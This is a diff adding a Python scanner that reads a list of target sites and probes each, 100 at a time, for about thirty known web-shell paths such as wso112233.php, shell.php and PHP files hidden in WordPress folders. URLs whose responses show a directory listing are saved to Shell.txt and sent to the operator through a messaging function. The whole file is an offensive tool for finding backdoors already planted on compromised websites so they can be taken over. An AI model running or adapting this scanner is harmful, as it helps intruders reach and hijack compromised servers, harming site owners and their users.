@@ -1,0 +1,46 @@
+def finder(i):
+    global Bad, Good, pro, password, mailer
+    head = {
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
+    try:
+        x = requests.session()
+        listaa = ['wp-content/uploads/2023/07/mar.php', 'wp-content/themes/seotheme/mar.php',
+        'wp-content/plugins/seoplugins/mar.php', 'images/profiles/cyber.jpg.php', 'wp-admin/al0fanew.php', 'wp-includes/SimplePie/themes.php',
+        'wp-admin/dropdown.php', 'wp-content/themes/twenty/twenty.php', 'cjfuns.php', 'wp-admin/dropdown.php', 'wp-includes/rest-api/about.php',
+        'radio.php', 'assets/img/kandidat/fget.php', 'wp-admin/css/colors/about.php', 'wp-admin/index.php', 'wp-includes/js/about.php','images/portfolio/modelos/about.php',
+        'images/empresas/about.php','dropdown.php', 'repeater.php', 'ok.php', 'wso112233.php', 'ws.php', 'x.php', 'wp-content/plugins/ioptimization/IOptimize.php?rchk',
+	'wp-content/updates.php', 'wp-includes/js/tinymce/skins/lightgray/img/index.php?p=', 'shell.php', 'BDKR28.php']
+        for script in listaa:
+            url = (i + "/" + script)
+            while True:
+                req_first = x.get(url, headers=head)
+                if "drwxr-xr-x" in req_first.text:
+                    Good = Good + 1
+                    #print(fw + "-|" + " Vuln > " + fg + url)
+                    print('[Vuln check] ======>>> '+url)
+                    # bot.sendMessage(user, url+"\n")
+                    with open("Shell.txt", "a") as file:
+                        file.write(url + "\n")
+                        file.close()
+                    SendMsg(url)
+                else:
+                    Bad = Bad + 1
+                    #print(fr + "-|" + " Not Vuln > " + fg + i)
+                    print('[Vuln check] ======>>> '+i)
+
+                    pass
+                break
+    except:
+        pass
+
+#def all(i):
+ #   finder(i)
+
+try:
+    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
+except IndexError:
+    path = str(sys.argv[0]).split('\\')
+    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
+
+Pool(int(100)).map(finder, target)
+main()
